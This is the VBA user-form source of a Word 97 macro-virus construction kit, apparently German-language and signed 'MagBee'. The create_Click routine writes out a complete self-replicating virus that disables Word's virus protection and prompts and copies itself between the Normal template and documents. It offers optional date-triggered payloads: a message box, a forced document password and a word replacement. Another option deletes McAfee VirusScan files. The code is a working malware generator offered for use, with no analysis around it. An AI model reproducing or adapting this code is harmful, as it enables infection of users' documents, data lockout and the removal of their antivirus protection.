Rem Attribute VBA_ModuleType=VBAFormModule
Option VBASupport 1
Private Sub boxzeigen_Click()

End Sub

Private Sub CheckBox3_Click()

End Sub

Private Sub CommandButton1_Click()
Hilfe.Show
End Sub

Private Sub create_Click()

Documents.Add

Set Target = ActiveDocument.VBProject.VBComponents(1).CodeModule

ende = "end if"
anzeichen = "'"
offnen = "sub autoopen()"
schliessen = "sub autoexit()"
speichern = "ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument"

vcode = "on error resume next" & Chr(10) _
& "'Made with the W97 MakroVirus Bausatz by MagBee" & Chr(10) & "ActiveDocument.ReadOnlyRecommended = False" & Chr(10) & "Options.VirusProtection = False" & Chr(10) _
& "Options.SaveNormalPrompt = False" & Chr(10) & "Application.DisplayAlerts = wdAlertsNone" & Chr(10) & "Application.EnableCancelKey = wdCancelDisabled" & Chr(10) _
& "Application.DisplayStatusBar = False" & Chr(10) & "Options.ConfirmConversions = False" & Chr(10) & "Application.ScreenUpdating = False" & Chr(10) & "If ThisDocument.Name =" & Chr$(34) & "Normal.dot" & Chr$(34) & "Then" & Chr(10) _
& "Set Source = NormalTemplate.VBProject.VBComponents(1).CodeModule" & Chr(10) _
& "Set Target = ActiveDocument.VBProject.VBComponents(1).CodeModule" & Chr(10) _
& "else" & Chr(10) & "Set Source = ActiveDocument.VBProject.VBComponents(1).CodeModule" & Chr(10) _
& Chr(10) & "Set Target = NormalTemplate.VBProject.VBComponents(1).CodeModule" & Chr(10) _
& "End If" & Chr(10) & "With Source" & Chr(10) & "vircode = .lines(1, .countoflines)" _
& Chr(10) & "End With" & Chr(10) & "With Target" & Chr(10) & ".deletelines 1, .countoflines" _
& Chr(10) & ".insertlines 1, vircode" & Chr(10) & "End With" & Chr(10) & Chr(10) & Chr(10) & Chr(10) _
& Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) _
& Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & Chr(10) & "end sub" _


If OptionButton1.Value = True Then
With Target
    .insertlines 1, offnen
End With
End If

If OptionButton2.Value = True Then
With Target
    .insertlines 1, schliessen
End With
End If




With Target
    .insertlines 2, vcode
End With

With Target
    .insertlines 42, speichern
End With

If boxzeigen.Value = True Then

nachricht = InputBox("Gebt hier die Nachricht ein, die in der Messagebox stehen soll", "Nachricht in der Messagebox")
trigger = "if day(now()) = " & Label1 & " and month(now()) = " & Label3 & " then"
mbox = "Msgbox " & Chr$(34) & nachricht & Chr$(34) & ", ," & Chr$(34) & "W97M Virus Bausatz by MagBee" & Chr$(34)

If CheckBox3.Value = True Then
With Target
    .insertlines 31, mbox
End With
GoTo weiterpw
End If

With Target
    .insertlines 30, trigger
    .insertlines 31, mbox
    .insertlines 32, ende
End With


End If

weiterpw:
If passwort.Value = True Then

pawo = InputBox("Wie soll das Passwort lauten (keine Leerzeichen)", "Passwortvergabe")
triggerpw = "if day(now()) = " & Label4 & " and month(now()) = " & Label6 & " then"
pw = "If ActiveDocument.HasPassword = False Then ActiveDocument.Password = " & Chr$(34) & pawo & Chr$(34)

If CheckBox6.Value = True Then
With Target
    .insertlines 35, pw
End With
GoTo weiterers
End If

With Target
    .insertlines 34, triggerpw
    .insertlines 35, pw
    .insertlines 36, ende
End With
End If

weiterers:
If CheckBox2.Value = True Then

wzuersetz = InputBox("Welches Wort soll ersetzt werden", "Wort ersetzen")
ersetzwort = InputBox("Durch welches Wort soll es ersetzt werden", "Wort ersetzen")

ersetzen = "Selection.Find.ClearFormatting" & Chr(10) & "Selection.Find.Replacement.ClearFormatting" _
& Chr(10) & "With Selection.Find" & Chr(10) & ".Text = " & Chr$(34) & wzuersetz & Chr$(34) & Chr(10) & ".Replacement.Text = " _
& Chr$(34) & ersetzwort & Chr$(34) & Chr(10) & ".Forward = True" & Chr(10) & ".Wrap = wdFindContinue" & Chr(10) & "End With" _
& Chr(10) & "Selection.Find.Execute Replace:=wdReplaceAll"

triggerers = "if day(now()) = " & Label5 & " and month(now()) = " & Label9 & " then"

If CheckBox7.Value = True Then
With Target
    .insertlines 39, ersetzen
End With
GoTo weiter
End If

With Target
    .insertlines 38, triggerers
    .insertlines 39, ersetzen
    .insertlines 40, ende
End With
End If

weiter:

If OptionButton3.Value = True Then
killja = "Kill (" & Chr$(34) & "c:\Programme\Mcafee\VirusScan\*.*" & Chr$(34) & ")"
With Target
    .insertlines 28, killja
End With
End If

vname = InputBox("Wie soll der Virus heißen ?", "creation", "VirusName")
ActiveDocument.SaveAs FileName:=vname, FileFormat:=wdFormatDocument
 
MsgBox "Dein Virus wurde unter Eigene Dateien gespeichert", , "W97M Bausatz by MagBee" & Chr$(34)
 
End Sub

Private Sub payload_Click()

End Sub

Private Sub OptionButton1_Click()

End Sub

Private Sub OptionButton2_Click()
MsgBox "Wichtig bei Autoexit zuerst den Virus schließen (Aktives Fenster in Word)" & Chr(10) & "und dann Word beenden !", , "W97M Virus Bausatz by MagBee"
End Sub

Private Sub OptionButton4_Click()

End Sub

Private Sub passwort_Click()

End Sub

Private Sub ScrollBar1_Change()
Label1.Caption = ScrollBar1.Value
End Sub

Private Sub ScrollBar2_Change()
Label3.Caption = ScrollBar2.Value
End Sub

Private Sub ScrollBar3_Change()
Label4.Caption = ScrollBar3.Value
End Sub

Private Sub ScrollBar4_Change()
Label5.Caption = ScrollBar4.Value
End Sub

Private Sub ScrollBar5_Change()
Label6.Caption = ScrollBar5.Value
End Sub

Private Sub ScrollBar6_Change()
Label9.Caption = ScrollBar6.Value
End Sub

Private Sub UserForm_Click()

End Sub

